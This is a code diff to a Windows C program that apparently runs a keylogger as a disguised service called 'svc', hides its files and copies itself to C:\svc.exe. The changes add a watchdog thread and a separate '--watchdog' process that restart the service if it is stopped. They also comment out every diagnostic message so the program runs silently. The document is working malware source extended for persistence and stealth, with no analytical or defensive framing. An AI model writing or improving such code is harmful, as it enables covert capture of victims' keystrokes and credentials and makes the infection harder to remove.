@@ -2,8 +2,10 @@
 #include <stdio.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
+#include <tchar.h>
 
 #define SERVICE_NAME "svc"
+#define WATCHDOG_MODE_FLAG "--watchdog"
 #define _WIN32_WINNT 0x0A00
 #define _WIN32_WINNT_WIN10_TH2 0x0A00
 #define _WIN32_WINNT_WIN10_RS1 0x0A00
@@ -12,21 +14,22 @@
 #define _WIN32_WINNT_WIN10_RS4 0x0A00
 #define _WIN32_WINNT_WIN10_RS5 0x0A00
 #define NTDDI_WIN10_CU 0x0A000000
+#define NEW_TINKY_EXE "C:\\svc.exe"
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 HANDLE hKeyloggerProcess = NULL;
 
-#define NEW_TINKY_EXE "C:\\svc.exe"
-
 char TINKY_EXE[MAX_PATH];
 char WINKY_EXE[MAX_PATH];
+
+DWORD WINAPI WatchdogThread(LPVOID lpParam);
 
 void SetTinkyPath(void)
 {
     if (GetModuleFileName(NULL, TINKY_EXE, MAX_PATH) == 0)
     {
-        printf("Failed to get current executable path. Error: %lu\n", GetLastError());
+        // printf("Failed to get current executable path. Error: %lu\n", GetLastError());
         return;
     }
 
@@ -44,7 +47,7 @@ int InstallService(void)
     SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!hSCManager)
     {
-        printf("OpenSCManager failed: %lu\n", GetLastError());
+        // printf("OpenSCManager failed: %lu\n", GetLastError());
         return -1;
     }
 
@@ -60,11 +63,11 @@ int InstallService(void)
     );
     if (!hService)
     {
-        printf("CreateService failed: %lu\n", GetLastError());
+        // printf("CreateService failed: %lu\n", GetLastError());
         CloseServiceHandle(hSCManager);
         return -1;
     }
-    printf("Service installed successfully.\n");
+    // printf("Service installed successfully.\n");
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
     return 0;
@@ -75,24 +78,24 @@ int UninstallService(void)
     SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!hSCManager)
     {
-        printf("OpenSCManager failed: %lu\n", GetLastError());
+        // printf("OpenSCManager failed: %lu\n", GetLastError());
         return -1;
     }
     
     SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, DELETE);
     if (!hService)
     {
-        printf("OpenService failed: %lu\n", GetLastError());
+        // printf("OpenService failed: %lu\n", GetLastError());
         CloseServiceHandle(hSCManager);
         return -1;
     }
     if (DeleteService(hService))
     {
-        printf("Service deleted successfully.\n");
+        // printf("Service deleted successfully.\n");
     }
     else
     {
-        printf("DeleteService failed: %lu\n", GetLastError());
+        // printf("DeleteService failed: %lu\n", GetLastError());
     }
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
@@ -261,7 +264,6 @@ DWORD WINAPI CheckForUpdates(LPVOID lpParam)
     return 0;
 }
 
-
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
     (void)argc;
@@ -290,6 +292,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
     StartKeylogger();
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchdogThread, NULL, 0, NULL); // Watchdog thread
 
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
@@ -308,14 +311,14 @@ int StartServiceProgrammatically(void)
     SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager)
     {
-        printf("OpenSCManager failed: %lu\n", GetLastError());
+        // printf("OpenSCManager failed: %lu\n", GetLastError());
         return 1;
     }
 
     SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_START);
     if (!hService)
     {
-        printf("OpenService failed: %lu\n", GetLastError());
+        // printf("OpenService failed: %lu\n", GetLastError());
         CloseServiceHandle(hSCManager);
         return 1;
     }
@@ -325,16 +328,16 @@ int StartServiceProgrammatically(void)
         DWORD err = GetLastError();
         if (err == ERROR_SERVICE_ALREADY_RUNNING)
         {
-            printf("Service is already running.\n");
+            // printf("Service is already running.\n");
         }
         else
         {
-            printf("StartService failed: %lu\n", err);
+            // printf("StartService failed: %lu\n", err);
         }
     }
     else
     {
-        printf("Service started successfully.\n");
+        // printf("Service started successfully.\n");
     }
 
     CloseServiceHandle(hService);
@@ -354,9 +357,69 @@ void stopService(void)
     CloseServiceHandle(hSCManager);
 }
 
+void LaunchWatchdogProcess(void)
+{
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    TCHAR commandLine[MAX_PATH * 2];
+
+    // printf("Launching watchdog process...\n");
+    // Prepare the command line for watchdog mode
+    _stprintf(commandLine, _T("%s %s"), _T(TINKY_EXE), _T(WATCHDOG_MODE_FLAG));
+
+    if (!CreateProcess(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    {
+        // printf("Failed to create watchdog process: %lu\n", GetLastError());
+    }
+    else
+    {
+        // printf("Watchdog process created successfully.\n");
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+DWORD WINAPI WatchdogThread(LPVOID lpParam)
+{
+    while (1)
+    {
+        Sleep(300000);
+
+        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+        if (hSCManager)
+        {
+            SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_QUERY_STATUS);
+            if (hService)
+            {
+                SERVICE_STATUS_PROCESS serviceStatus;
+                DWORD bytesNeeded;
+                if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatus,
+                                         sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
+                {
+                    if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
+                    {
+                        StartServiceProgrammatically();
+                        SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
+                        StartServiceCtrlDispatcher(ServiceTable);
+                    }
+                }
+                CloseServiceHandle(hService);
+            }
+            CloseServiceHandle(hSCManager);
+        }
+    }
+    return 0;
+}
+
 int main(int argc, char* argv[])
 {
     SetTinkyPath();
+
+    if (argc > 1 && strcmp(argv[1], WATCHDOG_MODE_FLAG) == 0)
+    {
+        WatchdogThread(NULL);
+        return 0;
+    }
 
     if (argc > 1)
     {
@@ -364,6 +427,7 @@ int main(int argc, char* argv[])
         {
             HideFiles();
             InstallService();
+            LaunchWatchdogProcess();
             return 0;
         }
         else if (strcmp(argv[1], "delete") == 0)
@@ -385,8 +449,9 @@ int main(int argc, char* argv[])
     else
     {
         SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
-        if (!StartServiceCtrlDispatcher(ServiceTable)) {
-            printf("StartServiceCtrlDispatcher failed: %lu\n", GetLastError());
+        if (!StartServiceCtrlDispatcher(ServiceTable))
+        {
+            // printf("StartServiceCtrlDispatcher failed: %lu\n", GetLastError());
         }
     }
     return 0;
